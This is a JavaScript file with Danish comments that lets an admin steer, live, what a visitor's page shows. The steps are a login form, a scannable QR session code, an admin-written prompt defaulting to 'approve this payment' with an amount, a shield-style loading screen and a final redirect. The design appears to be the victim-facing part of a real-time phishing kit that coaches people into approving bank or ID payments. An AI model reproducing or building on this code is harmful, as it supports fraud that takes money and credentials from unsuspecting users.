/* ════════════════════════════════════════════════════════════
   visitor-flow.js — live-styring fra admin (flow + QR + data)
   ════════════════════════════════════════════════════════════ */
let liveState = null;
let socket = null;

// ── init: hent state + kobl socket ──
async function init() {
  try {
    const r = await fetch('/api/public-state', { cache: 'no-store' });
    liveState = await r.json();
  } catch (e) { liveState = null; }
  try {
    socket = io();
    socket.on('state-update', (s) => { liveState = s; applyFlow(); });
  } catch (e) {}
  setInterval(async () => {
    try {
      const r = await fetch('/api/public-state', { cache: 'no-store' });
      const s = await r.json();
      if (JSON.stringify(s) !== JSON.stringify(liveState)) { liveState = s; applyFlow(); }
    } catch (e) {}
  }, 2000);
  applyFlow();
}

// ── live QR-tegning (til scan-trinnet) ──
function drawQR(url) {
  const el = document.getElementById('qrcodeLive');
  if (!el) return;
  el.innerHTML = '';
  if (window.QRCodeStyling) {
    new QRCodeStyling({
      width: 200, height: 200, type: 'svg',
      data: url, margin: 0,
      qrOptions: { errorCorrectionLevel: 'M' },
      dotsOptions: { type: 'square', color: '#000000' },
      cornersSquareOptions: { type: 'square', color: '#000000' },
      cornersDotOptions: { type: 'square', color: '#000000' },
      backgroundOptions: { color: '#ffffff' }
    }).append(el);
  } else if (window.QRCode) {
    new QRCode(el, { text: url, width: 200, height: 200, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
  }
}

// ── applyFlow: skjul/vis trin efter liveState.flow ──
function applyFlow() {
  if (!liveState) return;
  const flow = liveState.flow || 'scan';
  const loginForm = document.getElementById('loginForm');
  const loader = document.getElementById('loaderContainer');
  const qrZone = document.getElementById('qrLiveZone');
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  if (!loginForm) return;

  // gem alle trin først
  [step1, step2].forEach(el => { if (el) el.classList.add('hidden'); });
  if (loader) loader.classList.add('hidden');
  if (qrZone) qrZone.style.display = 'none';

  switch (flow) {
    case 'besked':
      // besked-trin: vis loginForm med besked-box
      loginForm.classList.remove('hidden');
      break;
    case 'scan':
      // QR-trin: vis QR-zone i kortet
      loginForm.classList.remove('hidden');
      if (qrZone) qrZone.style.display = 'block';
      if (liveState.sessionId) {
        drawQR(window.location.origin + '/r/' + liveState.sessionId);
      }
      break;
    case 'action':
      // handling: vis admin-tekst
      loginForm.classList.remove('hidden');
      const t = document.getElementById('actionTitleLive');
      if (t) t.textContent = (liveState.action && liveState.action.title) || 'Godkend denne betaling';
      const amt = document.getElementById('actionAmountLive');
      if (amt) amt.textContent = (liveState.action && liveState.action.amount) || '';
      break;
    case 'wait':
      // loader: fuld skærm skjold+ring
      loginForm.classList.add('hidden');
      if (loader) loader.classList.remove('hidden');
      break;
    case 'approved':
      // success: redirect til target
      if (liveState.target && liveState.target.trim()) {
        setTimeout(() => { window.location.href = liveState.target.trim(); }, 1200);
      }
      break;
  }
}

// start efter DOM load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}